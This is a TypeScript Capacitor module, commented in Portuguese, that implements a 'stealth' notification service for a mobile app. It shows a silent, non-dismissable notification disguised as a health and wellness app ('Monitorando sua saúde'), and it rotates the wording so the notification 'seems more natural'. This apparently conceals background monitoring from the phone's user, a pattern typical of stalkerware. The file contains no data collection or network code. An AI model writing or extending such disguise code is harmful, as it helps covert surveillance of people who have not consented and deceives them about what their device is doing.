import { LocalNotifications, ScheduleOptions } from '@capacitor/local-notifications';
import { Capacitor } from '@capacitor/core';

// Configuração da notificação disfarçada como app de saúde/fitness
const STEALTH_NOTIFICATION_ID = 9999;

const STEALTH_CONFIG = {
  title: 'Bem-estar Ativo',
  body: 'Monitorando sua saúde',
  smallIcon: 'ic_stat_heart', // Ícone pequeno para Android
  largeIcon: 'ic_launcher', // Ícone grande
  ongoing: true, // Não pode ser dispensada pelo usuário
  autoCancel: false,
  silent: true,
};

// Variações de texto para parecer mais natural
const TEXT_VARIATIONS = [
  { title: 'Bem-estar Ativo', body: 'Monitorando sua saúde' },
  { title: 'Bem-estar Ativo', body: 'Acompanhando seu dia' },
  { title: 'Saúde em Foco', body: 'Monitoramento ativo' },
  { title: 'Bem-estar Ativo', body: 'Cuidando de você' },
];

class StealthNotificationService {
  private isShowing = false;
  private hasPermission = false;

  /**
   * Solicita permissão para notificações
   */
  async requestPermission(): Promise<boolean> {
    if (!Capacitor.isNativePlatform()) {
      console.log('[StealthNotification] Skipping - not native platform');
      return false;
    }

    try {
      const result = await LocalNotifications.requestPermissions();
      this.hasPermission = result.display === 'granted';
      console.log('[StealthNotification] Permission:', this.hasPermission);
      return this.hasPermission;
    } catch (error) {
      console.error('[StealthNotification] Permission error:', error);
      return false;
    }
  }

  /**
   * Verifica se tem permissão
   */
  async checkPermission(): Promise<boolean> {
    if (!Capacitor.isNativePlatform()) {
      return false;
    }

    try {
      const result = await LocalNotifications.checkPermissions();
      this.hasPermission = result.display === 'granted';
      return this.hasPermission;
    } catch (error) {
      console.error('[StealthNotification] Check permission error:', error);
      return false;
    }
  }

  /**
   * Exibe a notificação de monitoramento disfarçada
   */
  async showMonitoringNotification(): Promise<void> {
    if (!Capacitor.isNativePlatform()) {
      console.log('[StealthNotification] Skipping show - not native platform');
      return;
    }

    if (this.isShowing) {
      console.log('[StealthNotification] Already showing');
      return;
    }

    // Verifica/solicita permissão se necessário
    if (!this.hasPermission) {
      const granted = await this.requestPermission();
      if (!granted) {
        console.log('[StealthNotification] No permission, skipping');
        return;
      }
    }

    try {
      // Seleciona uma variação de texto aleatória
      const variation = TEXT_VARIATIONS[Math.floor(Math.random() * TEXT_VARIATIONS.length)];

      const options: ScheduleOptions = {
        notifications: [
          {
            id: STEALTH_NOTIFICATION_ID,
            title: variation.title,
            body: variation.body,
            ongoing: true,
            autoCancel: false,
            silent: true,
            smallIcon: 'ic_stat_heart',
            // Android: mantém a notificação fixa
            extra: {
              ongoing: true,
              sticky: true,
            },
          },
        ],
      };

      await LocalNotifications.schedule(options);
      this.isShowing = true;
      console.log('[StealthNotification] Notification shown:', variation.title);
    } catch (error) {
      console.error('[StealthNotification] Error showing notification:', error);
    }
  }

  /**
   * Remove a notificação de monitoramento
   */
  async hideMonitoringNotification(): Promise<void> {
    if (!Capacitor.isNativePlatform()) {
      console.log('[StealthNotification] Skipping hide - not native platform');
      return;
    }

    if (!this.isShowing) {
      console.log('[StealthNotification] Not showing, nothing to hide');
      return;
    }

    try {
      await LocalNotifications.cancel({
        notifications: [{ id: STEALTH_NOTIFICATION_ID }],
      });
      this.isShowing = false;
      console.log('[StealthNotification] Notification hidden');
    } catch (error) {
      console.error('[StealthNotification] Error hiding notification:', error);
    }
  }

  /**
   * Atualiza o texto da notificação
   */
  async updateNotificationText(title?: string, body?: string): Promise<void> {
    if (!Capacitor.isNativePlatform() || !this.isShowing) {
      return;
    }

    try {
      // Remove e recria com novo texto
      await this.hideMonitoringNotification();
      
      const options: ScheduleOptions = {
        notifications: [
          {
            id: STEALTH_NOTIFICATION_ID,
            title: title || STEALTH_CONFIG.title,
            body: body || STEALTH_CONFIG.body,
            ongoing: true,
            autoCancel: false,
            silent: true,
            smallIcon: 'ic_stat_heart',
          },
        ],
      };

      await LocalNotifications.schedule(options);
      this.isShowing = true;
      console.log('[StealthNotification] Notification updated');
    } catch (error) {
      console.error('[StealthNotification] Error updating notification:', error);
    }
  }

  /**
   * Verifica se a notificação está sendo exibida
   */
  isNotificationShowing(): boolean {
    return this.isShowing;
  }
}

// Exporta uma instância singleton
export const stealthNotificationService = new StealthNotificationService();
